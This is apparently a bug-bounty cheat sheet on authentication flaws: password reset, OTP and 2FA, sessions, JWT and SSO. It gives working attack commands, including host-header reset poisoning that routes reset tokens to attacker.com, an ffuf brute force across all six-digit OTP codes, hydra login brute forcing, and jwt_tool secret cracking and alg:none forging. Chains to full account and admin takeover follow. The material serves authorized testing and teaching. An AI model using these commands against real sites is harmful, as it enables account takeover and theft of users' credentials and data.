# Authentication Vulnerabilities
> One-line summary: flaws in login, password reset, OTP/2FA, and session handling that let you become another user — ATO is the highest-value class most programs never cap.

## Overview
Authentication flaws let an attacker bypass, replay, or forge the mechanism that proves identity: weak password-reset tokens, OTPs without rate limiting, 2FA that can be skipped by calling the post-login endpoint directly, session identifiers that never rotate, or SSO/OAuth flows where the provider assertion isn't verified. They arise from auth being implemented as a checklist of steps in the UI while each backend endpoint stands alone and trusts the state the client presents. Impact starts at account takeover of a single user and escalates to mass ATO (token predictability), admin access, and full SSO-tenant compromise when the identity provider flow is broken.

## Where to find it
- Login: username enumeration, missing rate limit, password in response, auth bypass via SQLi/NoSQLi in the credential handler
- Password reset: token entropy, token binding, host-header use in reset links, reset via email change, response manipulation
- OTP / 2FA / MFA: code brute-force window, code reuse, TOTP drift tolerance, backup codes, "remember this device" cookies
- 2FA flow: step skipping, state machine flaws (verify endpoint callable without password step), response tampering (change 4xx to 200), swapping `user_id` in verify request
- Session handling: fixation, no rotation on login/logout, JWT weaknesses (alg:none, weak HMAC secret), cookie flags, session puzzles (returning pre-login session value)
- SSO / OAuth: redirect_uri validation, `state` CSRF, `email_verified` not enforced, implicit flow token leak, pre-account-takeover via unverified email linking
- Registration: duplicate-email case tricks (`A@x.com` vs `a@x.com`), mass assignment `role`/`verified` fields at signup
- Password change / email change: no current-password check, no re-auth, IDOR on the user being changed
- API keys / app passwords / devices: list/create/revoke endpoints leaking or accepting other users' tokens
- "Remember me" tokens and magic links: predictability and reuse

## Methodology
1. Map every auth entry point: login, register, forgot, reset, verify-email, OTP send/verify, 2FA setup, backup codes, SSO callback, logout, session refresh, password change.
2. Username enumeration first — a full response matrix of "exists vs not" tells you what a brute force will confirm. Check response body, length, timing, status codes, and case sensitivity of the identifier.
3. Password reset token analysis: request 3-5 resets to your own account and compare tokens. Check entropy (length, charset), timestamp-based construction (decode base64/URL, look for epoch), whether the token is bound to the user, and whether it's invalidated after use or after a new request.
4. Test the reset link's host: send `X-Forwarded-Host` / `Host` overrides during the request and see if the reset email link changes — classic reset-token theft via host header injection.
5. OTP/2FA: request a code, fuzz `000000-999999` with a single-concurrent pool, measure whether a rate limit triggers and at what count. Try code reuse (same OTP twice), no-expiry codes, and the "000000" / null-code defaults.
6. 2FA step skipping: after submitting the password (before the code), call protected endpoints directly with the returned session/partial token — e.g. `GET /account`, `GET /admin`, `POST /2fa/setup/disable`.
7. Response manipulation: intercept the 2FA/OTP response and flip `{"success":false}` → `{"success":true}`, change 401→200, or strip the `otp_required` field; if the app redirects on the client-side flag alone, you're in.
8. Session behavior: capture the session before login and after; if it doesn't rotate, that's fixation-prone. Log out and replay old cookies. Drop `Secure`/`HttpOnly`/`SameSite` checks by hand if the app expects them.
9. SSO/OAuth: test `redirect_uri` with path tricks (`@`, subdomain, open redirect), missing `state`, dropping `code_challenge`, and using the provider's email without `email_verified`.
10. Registration takeover: sign up with `victim@example.com` (or `victim+1`, trailing space, unicode) and see if the app treats it as the victim's identity; test case-insensitive DB unique index collisions.
11. For every confirmed issue write down the minimal request sequence that produces it, then verify with a second account pair.

## Payloads
Password reset token comparison (request 3, diff patterns):
```bash
for i in 1 2 3; do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"email":"me@example.com"}' \
    https://target.com/api/auth/forgot-password
  # read the email / mailcatcher and save the token param
done
# then:
python3 - <<'EOF'
import base64, binascii
for t in ["MTcwMDAwMDAwMDoxMjM0NTY3ODkw", "MTcwMDAwMDAwMTo5ODc2NTQzMjEw"]:
    try: print(base64.urlsafe_b64decode(t + "=="))
    except binascii.Error as e: print("not b64:", e)
EOF
```

Host-header reset poisoning:
```bash
curl -s -X POST https://target.com/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Host: attacker.com" \
  -d '{"email":"me@example.com"}'
```

OTP brute force with ffuf:
```bash
seq -f "%06g" 0 999999 > otp.txt
ffuf -u https://target.com/api/auth/verify-otp \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=SESSION_A" \
  -d '{"code":"FUZZ"}' \
  -w otp.txt -mc 200 -fr "invalid" -rate 30 -t 1
```

Raw HTTP — client-trusted 2FA gate:
```http
POST /api/auth/login HTTP/2
Host: target.com
Content-Type: application/json

{"username":"victim","password":"correct"}

HTTP/2 200 OK
{"mfa_required":true,"mfa_token":"eyJhbGciOi..."}

# Skip the code and hit a protected endpoint with the pre-MFA token:
GET /api/account/settings HTTP/2
Host: target.com
Authorization: Bearer eyJhbGciOi...
```

Response manipulation in Repeater: intercept the verify response and change
```
HTTP/2 401 Unauthorized        ->  HTTP/2 200 OK
{"success":false,"otp":true}   ->  {"success":true,"otp":true}
```
Then forward; if the SPA redirects to `/dashboard`, the app trusted the flag.

Session rotation check:
```bash
curl -si -c pre.txt https://target.com/login | grep -i set-cookie      # pre-login session
curl -si -b pre.txt -c post.txt -X POST https://target.com/login \
  -d "username=me&password=correct" | grep -i set-cookie               # compare values
```

## Bypasses & edge cases
- Rate limits that exist on `/login` but not on `/reset` or `/verify-otp`; limits that count per IP (rotate nothing — they often reset on `X-Forwarded-For`) or per account (may reset after a 200 response).
- OTP code reuse: capture a valid code, log out, replay within window; some endpoints accept a previous code because "used" is checked on a different record.
- Algorithmic OTP: codes derived from time or user ID (e.g., HOTP with counter not persisted) — enumerate a small window.
- 2FA on the login page but absent on: password reset, email change, API auth, mobile endpoints, SSO callback, "sign in with backup code" path.
- Password reset via email change: change email to `me+victim@example.com` or the reverse so the reset link lands on your inbox.
- Enumeration by side channel: response body, content-length, HTTP status, response time, Set-Cookie presence, even registration errors.
- Duplicate signup: submit `Victim@x.com` then log in with `victim@x.com`; check canonicalization (case, dots in gmail, `+` tags, unicode homoglyphs).
- JWT: `alg:none`, `HS256` signed with the server's public RSA key, weak secrets (`jwt_tool -C -d rockyou.txt`), `kid` path traversal, `jku`/`x5u` pointing at your server.
- Session fixation: pre-set `session=` in the URL, then login; if the same ID survives, the attacker who planted it wins.
- `remember_me` token: check reuse after logout, after password change, and on password reset of another user (does it invalidate sessions?).
- Race condition on the OTP request to reset the attempt counter, or on "resend code" to bypass the cooldown.
- Verbose errors: 500 on duplicate registration, SQL errors auth, stack traces disclosing the crypto library in use.

## Tools
- Burp Suite Pro: Repeater for step manipulation, Intruder with a single-request resource pool for OTP brute force, and "Send group in parallel" for race-on-OTP tests.
```bash
# Intruder positions: {"code":"§000000§"} ; Grep - Match: "success":true
```
- ffuf for OTPs and usernames (see payloads); use `-t 1` to avoid gaps and `-rate` to dodge blocks.
- hydra only against a *blinded* login if you must — but for bug bounty prefer Intruder so you can see the full response:
```bash
hydra -L users.txt -P pass.txt target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```
- jwt_tool for JWT attacks:
```bash
python3 jwt_tool.py eyJhbGciOi... -C -d /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py eyJhbGciOi... -X n -p "jwt"   # alg:none, HMAC with pubkey
```
- nuclei auth templates (only for misconfigs, not logic):
```bash
nuclei -tags auth -u https://target.com -stats
```
- mailcatcher / tmp mail services to capture reset emails fast; `mitmproxy` if you want to script token analysis.
- Have I Been Pwned API to check credential stuffing impact (don't test with real users' creds).

## Escalation & chaining
- Reset token stolen via host-header injection → change victim's password → ATO (highest-paying reset variant).
- OTP brute forced on an endpoint with no limit → ATO of any account, including admin (mass ATO = critical).
- 2FA skip on login but also on `disable-2fa` → attacker disables 2FA permanently.
- Session fixation → authenticated session inherits pre-planted ID → persistent ATO without credentials.
- SSO `email_verified` bypass → pre-account-takeover: register `victim@corp.com` at the IdP, log into the app, become the victim's account.
- Weak JWT secret cracked offline (`jwt_tool -C`) → forge `{"sub":"admin"}` → full admin takeover.
- Auth bypass in login SQLi → admin session → combine with IDOR/upload for system-level impact.

## Report notes
- Evidence chain: full raw request/response for each step of the exploit (send OTP, brute force (a few sample attempts + the hit), verify, access victim resource). A triager must be able to reproduce with the exact sequence.
- State the precondition explicitly: does it need a victim interaction (click reset link), knowledge of the email, or just the username? Preconditions separate Medium from Critical.
- For OTP issues show the rate-limit is absent at the endpoint level (N attempts over M seconds, with timestamps), and that attempts aren't capped per account.
- For 2FA skip, capture the protected-endpoint response (victim's data) using the pre-MFA token.
- For reset-token issues, include the decoded token structure and the entropy claim with timestamps.
- Never touch real user accounts in testing beyond your own; use two accounts you own and redact tokens in the report (rotate them after submission).
- Note session invalidation on fix (logout all, rotate secrets) if the vuln is token-related.

## References
- [PortSwigger Academy: Authentication](https://portswigger.net/web-security/authentication)
- [OWASP WSTG: Authentication Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/)
- [HackTricks: Reset/Forgotten Password](https://book.hacktricks.wiki/en/pentesting-web/reset-password.html)
- [HackTricks: Login Bypass](https://book.hacktricks.wiki/en/pentesting-web/login-bypass/index.html)
- [HackerOne #1485788 — Basecamp 2FA response manipulation](https://hackerone.com/reports/1485788)
- [HackerOne #587910 — wrong password accepted for 2FA disable](https://hackerone.com/reports/587910)
- [RubyGems CVE-2024-21654 — MFA bypass on password reset](https://blog.rubygems.org/2024/03/15/password-reset-vulnerability)
